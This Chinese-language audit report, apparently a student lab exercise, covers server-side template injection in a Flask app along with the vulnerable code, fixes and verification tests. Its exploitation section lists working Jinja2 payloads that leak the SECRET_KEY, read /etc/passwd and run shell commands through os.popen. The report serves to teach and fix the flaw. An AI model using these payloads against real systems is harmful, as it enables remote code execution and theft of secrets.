# Day 8 — SSTI 漏洞审计与修复报告

**王君豪-2024141530115**

| 字段 | 值 |
|------|------|
| 报告编号 | DAY8-SSTI-20260724 |
| 目标地址 | `http://192.168.137.129:5000` |
| 应用名称 | 用户管理系统（Flask + SQLite） |
| 审计日期 | 2026-07-24 |
| 审计类型 | 服务端模板注入（Server-Side Template Injection） |
| 发现数量 | 3 个 |
| 修复状态 | ✅ 全部已修复 |

---

## 一、漏洞汇总

| 编号 | 漏洞名称 | 等级 | 位置 | 风险 |
|------|---------|------|------|------|
| V-01 | `/welcome?name=` 参数 SSTI | 🔴 高危 | `app.py:739-745` | RCE、文件读取、密钥泄露 |
| V-02 | `/feedback` POST `name` 字段 SSTI | 🔴 高危 | `app.py:775,790` | RCE、文件读取、密钥泄露 |
| V-03 | `/feedback` POST `message` 字段 SSTI | 🔴 高危 | `app.py:776,791` | RCE、文件读取、密钥泄露 |

---

## 二、漏洞原理

### 什么是 SSTI？

SSTI（Server-Side Template Injection，服务端模板注入）是攻击者通过向模板中注入恶意模板表达式（如 Jinja2 的 `{{ }}` 语法），使得服务端在渲染模板时执行了攻击者控制的代码。

### Jinja2 模板引擎工作原理

```
模板字符串（含 {{ }} 表达式）
        │
        ▼
Jinja2 解析器 ──→ 识别 {{ }} 语法
        │
        ▼
执行 Python 表达式 ──→ 输出结果
```

当用户输入被直接拼接到模板字符串中时，攻击者可以通过构造 `{{ }}` 表达式来执行任意 Python 代码。

### 漏洞代码模式

```python
# ❌ 漏洞模式：用户输入通过 f-string 拼入模板
name = request.args.get("name", "")
render_template_string(f"<h1>{name}</h1>")
#                     ↑ name = "{{7*7}}" 时，Jinja2 会执行 7*7 → 49

# ✅ 安全模式：用户输入作为模板变量传入
name = request.args.get("name", "")
render_template_string("<h1>{{ name }}</h1>", name=name)
#                     ↑ name = "{{7*7}}" 时，Jinja2 输出原文 "{{7*7}}"
```

---

## 三、漏洞详情与利用

### V-01：/welcome GET 参数注入

**位置：** `app.py` 第 739-745 行

**漏洞代码：**
```python
name = request.args.get("name", "")
content = f"<h1>欢迎你，{name}！</h1>"           # name 通过 f-string 拼入
return render_template_string(f"""...{content}...""")
```

**攻击流程：**
```
攻击者构造 URL: /welcome?name={{config.SECRET_KEY}}
                  ↓
f-string 展开: "<h1>欢迎你，{{config.SECRET_KEY}}！</h1>"
                  ↓
Jinja2 解析: 执行 config.SECRET_KEY → 输出密钥
                  ↓
攻击者获取密钥，可伪造 Session Cookie
```

**利用结果（修复前）：**
```bash
# 基础运算
/welcome?name={{7*7}}                     → "欢迎你，49！"

# 密钥泄露
/welcome?name={{config.SECRET_KEY}}       → "欢迎你，8904c261..."

# 任意文件读取
/welcome?name={{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
                                          → "欢迎你，root:x:0:0..."

# 远程代码执行（RCE）
/welcome?name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
                                          → "欢迎你，uid=0(root)..."
```

---

### V-02 & V-03：/feedback POST 参数注入

**位置：** `app.py` 第 775-791 行

**漏洞代码：**
```python
name = request.form.get("name", "")
message = request.form.get("message", "")
result_html = f"""...
    <h2>{name} 的反馈：</h2>
    <p>{message}</p>
..."""
return render_template_string(result_html)
```

**利用结果（修复前）：**
```bash
curl -X POST /feedback -d "name={{7*7}}&message={{config.SECRET_KEY}}"
# → <h2>49 的反馈：</h2>
# → <p>8904c261...</p>
```

---

## 四、修复方案

### 核心修复：使用模板变量替代 f-string 拼接

```python
# ❌ 修复前（漏洞代码）
name = request.args.get("name", "")
render_template_string(f"<h1>{name}</h1>")
#                   用户输入是模板代码的一部分

# ✅ 修复后（安全代码）
name = request.args.get("name", "")
render_template_string("<h1>{{ name }}</h1>", name=name)
#                   用户输入作为数据传入，不参与模板编译
```

### 修复后代码

**/welcome 路由：**
```python
@app.route("/welcome")
def welcome():
    name = request.args.get("name", "")
    if not name:
        name = "亲爱的用户"
    nav = _build_nav_html()
    return render_template_string("""
        <h1>欢迎你，{{ name }}！</h1>
    """, name=name, nav=nav)   # ✅ name 和 nav 都作为模板变量
```

**/feedback 路由：**
```python
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    nav = _build_nav_html()
    if request.method == "POST":
        name = request.form.get("name", "")
        message = request.form.get("message", "")
        return render_template_string("""
            <h2>{{ name }} 的反馈：</h2>
            <p>{{ message }}</p>
        """, name=name, message=message, nav=nav)  # ✅ 变量传入
```

### 修复原理

| 对比项 | 修复前（f-string 拼接） | 修复后（模板变量） |
|--------|------------------------|-------------------|
| `name = "{{7*7}}"` | `f"<h1>{name}</h1>"` → `"<h1>{{7*7}}</h1>"` → Jinja2 执行 → `49` | `"<h1>{{ name }}</h1>"` → Jinja2 取变量值 → `"{{7*7}}"` |
| 用户输入角色 | 模板代码的一部分 | 模板变量的值 |
| Jinja2 处理 | 解析为表达式执行 | 作为字符串输出（自动转义） |
| 安全性 | ❌ SSTI 漏洞 | ✅ 安全 |

### 涉及文件

| 文件 | 修改内容 |
|------|---------|
| `app.py` | `/welcome` 路由：`f"<h1>欢迎你，{name}！</h1>"` → `"<h1>欢迎你，{{ name }}！</h1>"` + 传入 `name=name`；`/feedback` 路由：`f"<h2>{name}...</h2>"` → `"<h2>{{ name }}...</h2>"` + 传入 `name=name, message=message`；`{nav}` 改为 `{{ nav \| safe }}` 模板变量传入 |

---

## 五、修复验证

| 测试项 | Payload | 修复前 | 修复后 |
|--------|---------|--------|--------|
| 基础运算 | `{{7*7}}` | `49` | `{{7*7}}`（原文）✅ |
| 字符串处理 | `{{'test'\|upper}}` | `TEST` | `{{'test'\|upper}}` ✅ |
| 密钥泄露 | `{{config.SECRET_KEY}}` | `8904c261...` | `{{config.SECRET_KEY}}` ✅ |
| 文件读取 | `{{open('/etc/passwd').read()}}` | `root:x:0:0...` | 原文输出 ✅ |
| RCE | `{{os.popen('id').read()}}` | `uid=0(root)` | 原文输出 ✅ |
| 正常功能 | `name=张三` | `欢迎你，张三！` | `欢迎你，张三！` ✅ |
| 反馈正常 | `name=王君豪, message=测试` | 正常显示 | 正常显示 ✅ |
| 原有功能 | 登录/搜索/充值等 | 正常 | 正常 ✅ |

---

## 六、防御建议

| 防御层次 | 措施 | 说明 |
|---------|------|------|
| 代码层 | **禁止 f-string 拼接模板** | 始终使用模板变量 `{{ var }}` + `render_template_string(tpl, var=value)` |
| 代码层 | **使用 render_template 替代** | 优先使用独立的模板文件（`.html`），而非 `render_template_string` |
| 审计层 | **代码审查** | 检查所有 `render_template_string` 调用，确认无用户输入拼接 |
| 测试层 | **自动化扫描** | 使用 Semgrep 规则检测 `render_template_string(f"...{...}...")` 模式 |
| 运行时 | **沙箱模式** | Jinja2 沙箱模式可限制模板中的危险函数访问（但非完全可靠） |
